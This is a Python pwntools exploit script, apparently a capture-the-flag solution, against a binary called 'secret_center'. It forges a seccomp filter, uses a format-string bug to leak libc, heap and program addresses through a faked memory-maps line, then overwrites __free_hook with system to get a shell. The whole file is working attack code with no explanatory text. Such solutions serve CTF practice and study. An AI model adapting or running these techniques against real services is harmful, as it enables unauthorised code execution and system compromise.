
from pwn import *
import time
debug=0


elf = ELF('./secret_center')
libc_name = '/lib/x86_64-linux-gnu/libc-2.23.so'
libc = ELF(libc_name)
context.log_level = 'debug'
if debug:
	p= process('./secret_center')
else:
	#p = remote('106.75.73.20', 8999)#process('./pwn1')
	p = remote('127.0.0.1', 10006)
'''
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x06 0x00 0x00000003  if (A == close) goto 0010
 0004: 0x15 0x05 0x00 0x000000e7  if (A == exit_group) goto 0010
 0005: 0x15 0x00 0x03 0x00000002  if (A != open) goto 0009
 0006: 0x20 0x00 0x00 0x00000010  A = args[0]
 0007: 0x54 0x00 0x00 0x000000ff  A &= 0xff
 0008: 0x15 0x01 0x00 0x0000007c  if (A == 124) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
 0011: 0x06 0x00 0x00 0x00050001  return ERRNO(1)
'''
def z(a=''):
	if debug:
		gdb.attach(p,a)
def delete():
	p.recvuntil('>\n')
	p.sendline('3')
def guard_ready():
	p.recvuntil('>\n')
	p.sendline('4')
def set_guard():
	p.recvuntil('>\n')
	p.sendline('5')
def edit(size,content):
	p.recvuntil('>\n')
	p.sendline('6')
	p.recvuntil('size: ')
	p.sendline(str(size))
	p.recvuntil('Content: \n')
	p.send(content)	
def input(size,content):
	p.recvuntil('>\n')
	p.sendline('2')
	p.recvuntil('Secret Size: ')
	p.sendline(str(size))
	p.recvuntil('Content: \n')
	p.send(content)
	#sleep(0.1)
def rule(code,jt ,jf ,k):
	return p16(code) + p8(jt) + p8(jf) + p32(k) 
def build_rule():
	payload = ''
	payload+= rule(0x20 ,0x00, 0x00, 0x00000004) #  A = arch
	payload+= rule(0x15 ,0x00, 0x08, 0xc000003e) #  if (A != ARCH_X86_64) goto 0010
	payload+= rule(0x20 ,0x00, 0x00, 0x00000000) #  A = sys_number
	payload+= rule(0x15 ,0x06, 0x00, 0x00000003) #  if (A == close) goto 0010
	payload+= rule(0x15 ,0x05, 0x00, 0x000000e7) #  if (A == exit_group) goto 0010
	payload+= rule(0x15 ,0x00, 0x03, 0x00000002) #  if (A != open) goto 0009
	payload+= rule(0x20 ,0x00, 0x00, 0x00000010) #  A = args[0]
	payload+= rule(0x54 ,0x00, 0x00, 0x000000ff) #  A &= 0xff
	payload+= rule(0x15 ,0x01, 0x00, 0x0000007c) #  if (A == 124) goto 0010
	payload+= rule(0x06 ,0x00, 0x00, 0x7fff0000) #  return ALLOW
	payload+= rule(0x06 ,0x00, 0x00, 0x00050000) #  return ERRNO(2)
	return payload

input(0xF0 ,'p4nda') #1
delete()#2
guard_ready()#3

rule_data = build_rule()#4
edit(len(rule_data),rule_data)#5
set_guard()#6
#z('b fopen\nb __fprintf_chk\nc')

fmt = ("%256p"*0x19+'%n').ljust(0xa0,'a')
input(0x120,fmt+'\x10')#7
p.recvuntil("Not Good Secret :P\n\n")
maps = '000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/p4nda'
p.sendline(maps)
input(0x68,'\x00')#8
libc_address = 0
heap_address = 0
pie = 0
while 1:
	tmp = p.readline()
	if "close" in tmp:
		tmp+= p.readline()
		tmp.replace("It's close.. Try to get a shell!\n",'')
	print '[?]',tmp#.split('-')[0]
	if ('libc-2.23.so' in tmp):
		addr = int('0x'+tmp.split('-')[0],16)
		if libc_address == 0:
			libc_address = addr
	if 'heap' in tmp:
		addr = int('0x'+tmp.split('-')[0],16)
		if heap_address == 0:
			heap_address = addr
	if 'secret_center' in tmp:
		addr = int('0x'+tmp.split('-')[0],16)
		if pie == 0:
			pie = addr

	if (libc_address*heap_address*pie != 0):
		break
print '[+]libc_address',hex(libc_address)
print '[+]heap_address',hex(heap_address)
print '[+]pie',hex(pie)
now = 0
last= 0
fmt = ('%256p'*33)
target = libc_address+libc.symbols['system']
where  = libc_address+libc.symbols['__free_hook']
for i in range(6):
	now = (target>>(i*8))&0xff
	if last<now:
		fmt+= '%'+str(now-last)+'c' + '%hhn'
	else:
		fmt+= '%'+str(0x100+now-last)+'c'+ '%hhn'
	last =  now

fmt+=';sh'
fmt = fmt.ljust(0xe0,'\0')
for i in range(6):
	fmt+= p64(0x31)+p64(where+i)	
input(0x150,fmt+'\0')#9
print 'fmt:',hex(len(fmt)),fmt
p.recvuntil('It\'s close.. Try to get a shell!')
p.sendline(maps)
delete()


p.interactive()

